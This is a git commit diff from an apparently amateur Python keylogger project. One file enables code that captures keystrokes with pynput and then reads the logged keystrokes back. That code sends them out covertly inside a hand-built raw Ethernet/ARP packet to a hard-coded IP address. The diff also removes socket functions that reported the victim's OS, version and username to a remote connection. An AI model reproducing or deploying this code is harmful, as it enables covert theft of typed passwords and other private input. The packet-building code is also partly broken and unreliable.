2ca459cbb646d8eacd469fc989c8cb3f0772ed68
Jamaika <benarfi.2001@gmail.com>
2022-05-22 12:55:46 +0100

    This Is The Final Version Of The Project

--- Haitem_code.py
+++ Haitem_code.py
@@ -19,25 +19,25 @@ def outside(key):
 with Listener(on_press=input , on_release=outside) as listener:
     listener.join()
 
-# f = open('keylogger.txt', 'r')
-# message = f.read() 
-# f.close()
+f = open('keylogger.txt', 'r')
+message = f.read() 
+f.close()
 
-# rawSocket = socket.socket(socket.PF_PACKET, socket.SOCK_RAW, socket.htons(0x0800))
-# rawSocket.bind(("eth0", socket.htons(0x0800)))
+rawSocket = socket.socket(socket.PF_PACKET, socket.SOCK_RAW, socket.htons(0x0800))
+rawSocket.bind(("eth0", socket.htons(0x0800)))
 
-# eth_hdr = struct.pack("!6s6sH", "\xbb\xbb\xbb\xbb\xbb\xbb", "\xaa\xaa\xaa\xaa\xaa\xaa", "\x08\x06") # 0x0806 for ARP
+eth_hdr = struct.pack("!6s6sH", "\xbb\xbb\xbb\xbb\xbb\xbb", "\xaa\xaa\xaa\xaa\xaa\xaa", "\x08\x06") # 0x0806 for ARP
 
-# src_ip = socket.inet_aton("10.10.0.15" )
-# dst_ip = socket.inet_aton("192.168.0.107")
+src_ip = socket.inet_aton("10.10.0.15" )
+dst_ip = socket.inet_aton("192.168.0.107")
 
-# #ARP Header (l’entête ARP)
-# #Protocol type => 0x0800 – IP
-# #Hardware Address Length => 06 – Ethernet
-# #Protocol Address Length => 04 – IP v4
-# #Operation => 01 – Request
+#ARP Header (l’entête ARP)
+#Protocol type => 0x0800 – IP
+#Hardware Address Length => 06 – Ethernet
+#Protocol Address Length => 04 – IP v4
+#Operation => 01 – Request
 
-# arp_hdr = struct.pack("!HHBBH6s4s6s4s", "\x00\x01", "\x08\x00", "\x06", "\x04", "\x00\x01", "\xaa\xaa\xaa\xaa\xaa\xaa", src_ip, "\xbb\xbb\xbb\xbb\xbb\xbb", dst_ip)
+arp_hdr = struct.pack("!HHBBH6s4s6s4s", "\x00\x01", "\x08\x00", "\x06", "\x04", "\x00\x01", "\xaa\xaa\xaa\xaa\xaa\xaa", src_ip, "\xbb\xbb\xbb\xbb\xbb\xbb", dst_ip)
 
-# pkt = eth_hdr + arp_hdr + message
-# rawSocket.send(pkt)
+pkt = eth_hdr + arp_hdr + message
+rawSocket.send(pkt)
--- keyLooger.py
+++ keyLooger.py
@@ -1,38 +1,6 @@
 from pynput.keyboard import Listener , Key
 import platform,os,sys,socket
 
-def C_server(ip,port):
-    sock = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
-    print('Socket has been created\n')# to be removed
-    try:
-        sock.bind((ip, port))
-        print('host Succesfully binded !\n')# to be removed
-    except Exception as err:
-        print ('Binding has failed. Error Code is : ' + str(err[0])+ ' Message : ' + err[1])# to be removed
-        sys.exit()
-
-    return sock
-
-def conn_hundler(sock):
-    try :    
-        sock.listen(1)
-        connection_infos ,(client_host, client_port) = sock.accept()
-        print(f'Connection From: {client_host} on Port {client_port}\n')# to be removed
-        connection_infos.sendall(f" Your Connected to a : {platform.uname().system} && version : {platform.uname().version} && User : {os.getlogin( )} \n".encode())
-
-    except Exception as e :
-        print('failed to listen ! : '+e)# to be removed
-
-    return connection_infos
-
-def Sender(remote_host,data):
-    try : 
-        remote_host.sendall(data.encode())
-        return True
-    except Exception as e : 
-        print(' Error While Sending : %s',e)# to be removed
-
-
 #f = open('sniff.txt','a')
 log = ""
 
